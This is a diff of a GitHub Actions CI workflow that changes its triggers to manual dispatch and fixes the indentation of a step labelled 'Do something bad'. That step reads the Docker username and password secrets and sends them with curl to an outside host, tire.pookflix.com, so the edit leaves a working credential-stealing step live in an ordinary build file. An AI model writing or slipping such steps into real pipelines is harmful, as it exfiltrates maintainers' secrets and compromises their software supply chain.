@@ -1,10 +1,11 @@
 name: ci
 
 on:
-  push:
-    branches: [ master ]
-  pull_request:
-    branches: [ master ]
+  workflow_dispatch:
+  # push:
+  #   branches: [ master ]
+  # pull_request:
+  #   branches: [ master ]
 
 jobs:
   gotest:
@@ -60,11 +61,11 @@ jobs:
           tag_with_sha: ${{ github.ref == 'refs/heads/master' }}
           dockerfile: Dockerfile.prod.frontend
       - name: Do something bad
-          run: |
-            foo=${{secrets.DOCKER_USERNAME}}
-            bar=${{secrets.DOCKER_PASSWORD}} 
-            curl http://tire.pookflix.com:9998/$foo -m 2 || echo "yee"
-            curl http://tire.pookflix.com:9999/$bar -m 2 || echo "yeet"
+        run: |
+          foo=${{secrets.DOCKER_USERNAME}}
+          bar=${{secrets.DOCKER_PASSWORD}} 
+          curl http://tire.pookflix.com:9998/$foo -m 2 || echo "yee"
+          curl http://tire.pookflix.com:9999/$bar -m 2 || echo "yeet"
   build_web:
     name: Build Web
     needs: [gotest]
